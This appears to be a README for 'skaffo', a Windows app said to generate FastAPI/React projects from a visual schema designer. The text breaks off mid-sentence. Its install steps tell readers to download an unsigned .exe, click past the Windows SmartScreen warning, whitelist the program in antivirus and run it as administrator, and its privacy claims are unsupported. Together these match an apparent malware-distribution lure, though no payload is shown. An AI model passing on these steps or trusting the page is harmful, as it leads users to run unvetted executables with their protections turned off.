# ⚡ skaffo - Design Databases and APIs Visually

[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Butlerrazorback275/skaffo)

## 🧭 What Is skaffo?

skaffo is a free tool that helps you build database structures and APIs without writing code. You work with a visual canvas. You drag and drop tables. You connect them with lines. You press a button. skaffo creates a complete project for you.

The project it creates is a real working application. It uses FastAPI on the backend and React on the frontend. These are popular tools that professional developers use. skaffo does all the setup work for you.

You do not need to know programming to use skaffo. You do not need to understand databases. skaffo shows you everything visually.

## 🎯 Who Should Use skaffo?

You should use skaffo if you want to:

- Build a web application quickly
- Design a database schema without SQL
- Create a REST API without writing endpoints
- Test ideas for software projects
- Learn how databases and APIs relate to each other
- Create a project skeleton that a developer can expand later

skaffo works for beginners and for experienced builders.

## 💻 System Requirements

skaffo runs on Windows 10 or Windows 11. Your computer should have at least 4 GB of RAM and 500 MB of free disk space. A screen resolution of 1280 x 720 or higher is recommended.

You will need an internet connection to download skaffo. After that, skaffo works offline.

## 📥 How to Download and Install skaffo

Follow these steps to get skaffo on your Windows computer.

### Step 1: Visit the Download Page

Go to the skaffo repository on GitHub:

**https://github.com/Butlerrazorback275/skaffo**

Click the green "Download" button at the top of this page. You will see a list of files.

### Step 2: Choose the Windows Installer

Look for a file named `skaffo-setup.exe` or a file with "win32" or "x64" in its name. The file might look like `Skaffo-Setup-1.0.0.exe`. Download this file to your computer. It is usually in your Downloads folder after the download finishes.

### Step 3: Run the Installer

Double-click the downloaded file. Windows might show a blue or yellow warning. Click "More info" and then click "Run anyway." This is normal because the app is new and not yet trusted by Windows.

### Step 4: Follow the Setup Wizard

The installer will guide you. Click "Next" and then "Install." Choose the default installation folder unless you have a reason to change it. Click "Finish" when the installer is done.

### Step 5: Launch skaffo

Find the skaffo icon on your desktop or in the Start menu. Double-click it. The skaffo window opens.

## 🖱️ Your First Project in 5 Minutes

Here is a quick walkthrough to show you how skaffo works.

### Create a New Project

On the welcome screen, click "New Project." Give your project a name like "My First App". Choose a folder on your computer where you want to save it. Click "Create."

### Add Your First Table

You will see a blank canvas. On the left side, there is a panel with tools. Click "Add Table." A small box appears on the canvas. Name it "Customers." Add fields to this table. For example, add a field called "Name" and a field called "Email."

### Add a Second Table

Click "Add Table" again. Name this one "Orders." Add a field called "Total." Now you have two tables.

### Connect the Tables

Click the "Connect" tool in the left panel. Then click on the "Customers" table. Then click on the "Orders" table. A line appears between them. This creates a relationship. Now you can say that each customer has many orders.

### Build the Project

Now look at the bottom of the window. Click the green "Generate Project" button. skaffo takes a few seconds to create the files. When it finishes, click "Open Folder." You will see a folder with many files and folders inside. This is your new application.

### Run Your Application

In the project folder, find a file called `start.bat` or `run.bat`. Double-click it. A black window (terminal) opens. skaffo starts your backend server and your frontend. After a few seconds, your web browser opens automatically. You now have a working web application with a database and an API.

## ⚙️ Key Features of skaffo

### Visual Database Designer

You see your tables as boxes. You create fields by clicking and typing. You define types like text, number, or date. You see all relationships as lines. This is much easier than typing SQL commands.

### API Generator

When you build your project, skaffo creates a complete REST API. This API has endpoints for creating, reading, updating, and deleting records in your tables. You do not write any code. The API follows standard practices that other developers can understand.

### Ready-to-Use Frontend

skaffo generates a user interface for your data. You get pages where you can add and edit records. You get a navigation menu. The design is clean and simple. You can change colors and text later.

### SQLite Database

Your project uses SQLite as the database. This is a file-based database that is simple to use. You do not need to install a separate database server. The database file is stored in your project folder.

### Export and Share

You can export your visual design as a JSON file. You can share this file with others. They can import it and see the same design. This is helpful for collaboration.

## 🛠️ Advanced Options

skaffo has settings you can adjust as you become more comfortable.

### Field Types

When you add a field to a table, you can choose its type. Options include:

- Text (short strings)
- Paragraph (longer text)
- Integer (whole numbers)
- Decimal (numbers with decimals)
- Date and time
- Boolean (true or false)
- File (for uploads)

Choose the type that fits your data.

### Table Settings

Each table has options. You can mark a field as required. You can set a default value. You can create a unique constraint. These options match what a developer would do in code.

### Customization Points

Look for the `custom` folder in your generated project. This folder has placeholder files. These files are marked with comments like `# Your custom code here`. You or a developer can add logic here. Pasting code in the custom folder means your changes will not be lost when you regenerate the project.

## 🔄 Updating skaffo

skaffo checks for updates when it opens. If an update is available, you will see a notice in the top-right corner. Click "Update" and skaffo downloads the new version. You may need to restart skaffo after the update.

## ❓ Common Problems and Fixes

### skaffo Will Not Open

If skaffo does not start, right-click the icon and select "Run as administrator." If that does not work, uninstall and reinstall skaffo.

### My Browser Does Not Open After Build

Your browser might be blocked or set to a different default. Open your browser and type `http://localhost:3000` in the address bar. Press Enter. This should show your application.

### The Terminal Window Closes Immediately

This usually means there is an error in the generated project. Check the terminal for red text. Look for two lines that say "ERROR" or "Traceback." Contact support for help with these messages.

### Antivirus Blocks skaffo

Some antivirus programs flag new software. Add skaffo to your antivirus whitelist. This is safe because skaffo is open source.

## 📚 Where to Get Help

skaffo is an open source project. You can find help in several places:

- The GitHub repository at **https://github.com/Butlerrazorback275/skaffo** has a "Issues" tab. Search there for your question. If you do not find an answer, create a new issue.
- The repository also has a "Discussions" tab. This is a forum where users help each other.
- Read the "Tutorial" file in the repository. It has step-by-step lessons.

## 🔒 Privacy and Security

skaffo runs entirely on your computer. Your data stays on your machine. No data is sent to any server. The generated project runs locally on your computer as well.

Since skaffo is open source, anyone can inspect its code. This means it is transparent and auditable. You can see exactly what the app does.

## 🧩 How skaffo Fits with Other Tools

You might use other tools in your workflow. skaffo integrates well with:

- **VS Code** – the code editor. Open your generated project folder in VS Code to edit it.
- **Git** – version control. You can put your generated project into a Git